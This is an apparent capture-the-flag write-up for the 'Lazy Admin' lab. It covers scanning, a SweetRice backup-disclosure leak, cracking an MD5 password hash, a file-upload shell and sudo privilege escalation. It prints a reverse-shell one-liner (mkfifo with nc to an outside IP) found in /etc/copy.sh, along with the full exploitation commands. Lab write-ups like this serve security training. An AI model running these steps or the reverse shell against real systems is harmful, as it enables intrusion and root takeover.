# Lazy Admin

Notes!

## Recon

### nmap
`nmap -A $TARGET_IP`

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 49:7c:f7:41:10:43:73:da:2c:e6:38:95:86:f8:e0:f0 (RSA)
|   256 2f:d7:c4:4c:e8:1b:5a:90:44:df:c0:63:8c:72:ae:55 (ECDSA)
|_  256 61:84:62:27:c6:c3:29:17:dd:27:45:9e:29:cb:90:5e (EdDSA)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
MAC Address: 02:94:B6:75:51:69 (Unknown)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.60%E=4%D=7/7%OT=22%CT=1%CU=31543%PV=Y%DS=1%DC=D%G=Y%M=0294B6%TM
OS:=64A88FF5%P=x86_64-pc-linux-gnu)SEQ(SP=FB%GCD=1%ISR=FA%TI=Z%CI=Z%TS=A)SE
OS:Q(SP=FB%GCD=1%ISR=FA%TI=Z%CI=Z%II=I%TS=A)OPS(O1=M2301ST11NW7%O2=M2301ST1
OS:1NW7%O3=M2301NNT11NW7%O4=M2301ST11NW7%O5=M2301ST11NW7%O6=M2301ST11)WIN(W
OS:1=68DF%W2=68DF%W3=68DF%W4=68DF%W5=68DF%W6=68DF)ECN(R=Y%DF=Y%T=40%W=6903%
OS:O=M2301NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R
OS:=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%
OS:A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%
OS:DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIP
OS:L=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)

Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
1   0.33 ms ip-10-10-178-35.eu-west-1.compute.internal ($TARGET_IP)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 24.16 seconds
```

### Gobuster

`# gobuster dir -u $TARGET_IP -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt `

```
/content (Status: 301)
/server-status (Status: 403)
```
`# gobuster dir -u $TARGET_IP/content -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt `

```
/images (Status: 301)
/js (Status: 301)
/inc (Status: 301)
/as (Status: 301)
/_themes (Status: 301)
/attachment (Status: 301)
```

### Website 

Pages that are worth looking at:

`http://$TARGET_IP/content/`
Powered by Basic-CMS.ORG SweetRice.


`http://$TARGET_IP/content/as is the sign in page.`

`http://$TARGET_IP/content/inc/lastest.txt tells us it is 1.5.1`


https://www.exploit-db.com/exploits/40718 (Backup disclosure)

`http://$TARGET_IP/content/inc/mysql_backup/`

`"Description\\";s:5:\\"admin\\";s:7:\\"manager\\";s:6:\\"passwd\\";s:32:\\"42f749ade7f9e195bf475f37a44cafcb\\";s:5:\\"close\\";`

`42f749ade7f9e195bf475f37a44cafcb` hash?

`# hashid hash`

```
--File 'hash'--
Analyzing '42f749ade7f9e195bf475f37a44cafcb'
[+] MD2 
[+] MD5 
[+] MD4 
[+] Double MD5 
[+] LM 
[+] RIPEMD-128 
[+] Haval-128 
[+] Tiger-128 
[+] Skein-256(128) 
[+] Skein-512(128) 
[+] Lotus Notes/Domino 5 
[+] Skype 
[+] Snefru-128 
[+] NTLM 
[+] Domain Cached Credentials 
[+] Domain Cached Credentials 2 
[+] DNSSEC(NSEC3) 
[+] RAdmin v2.x 
```

`# hashcat -m 0 hash /usr/share/wordlists/rockyou.txt`

```
42f749ade7f9e195bf475f37a44cafcb:Password123
```

We can log in with `manager:Password123`.


## Getting access

https://www.exploit-db.com/exploits/40716 (file upload exploit)

`http://$TARGET_IP/content/attachment/shell.phtml` (.php doesn't work)

Check `nc`.

## Escalation

### mysql

`$ cat mysql_login.txt `

```
rice:randompass
```

`$ mysql -u rice -p`

`\s`

```
--------------
mysql  Ver 14.14 Distrib 5.7.28, for Linux (i686) using  EditLine wrapper

Connection id:		6
Current database:	
Current user:		rice@localhost
SSL:			Not in use
Current pager:		stdout
Using outfile:		''
Using delimiter:	;
Server version:		5.7.28-0ubuntu0.16.04.2 (Ubuntu)
Protocol version:	10
Connection:		Localhost via UNIX socket
Server characterset:	latin1
Db     characterset:	latin1
Client characterset:	latin1
Conn.  characterset:	latin1
UNIX socket:		/var/run/mysqld/mysqld.sock
Uptime:			29 min 30 sec

Threads: 1  Questions: 18  Slow queries: 0  Opens: 109  Flush tables: 1  Open tables: 28  Queries per second avg: 0.010
--------------
```
This doesn't seem to go anywhere...


### backup.pl

`$ sudo -l` shows what programs we can execute as sudo without a password.

```    
(ALL) NOPASSWD: /usr/bin/perl /home/itguy/backup.pl
```

backup.pl is:
```
#!/usr/bin/perl

system("sh", "/etc/copy.sh");
```


`$ cat /etc/copy.sh`
```
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.0.190 5554 >/tmp/f
```
This is a script which opens a reverse TCP shell.
```
-rw-r--rwx 1 root root 81 Nov 29  2019 /etc/copy.sh
```
We see that we have read-write-execute privilege on this. `/etc/copy.sh` is a reverse TCP shell. We can change the IP in `/etc/copy.sh` and open a new `nc` listener.

I didn't want to open another `nc` so I changed `/etc/copy.sh` contents to `/bin/bash` so it executes a shell.

`www-data@THM-Chal:/home/itguy$ sudo /usr/bin/perl /home/itguy/backup.pl`

Note that we can only execute the absolute path without the password. Relative paths will ask us the password.

Now we have root!
